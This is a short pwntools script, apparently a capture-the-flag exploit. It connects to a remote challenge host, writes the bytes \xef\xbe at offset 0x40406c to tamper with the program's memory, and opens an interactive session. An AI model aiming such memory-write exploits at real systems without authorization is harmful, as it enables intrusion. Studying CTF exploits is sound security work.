#!/usr/bin/env python3
from pwn import *

#context.binary = elf = ELF('./out')
context.terminal = 'kitty -e sh -c'.split()

def conn():
    if args.REMOTE:
        return remote('20.199.93.34', 13003)
    else:
        #return process([elf.path])
        return
    

r = conn()

r.sendlineafter(b'offset: ', str(0x40406c).encode())
r.sendlineafter(b'bytes: ', b'\xef\xbe')

r.interactive()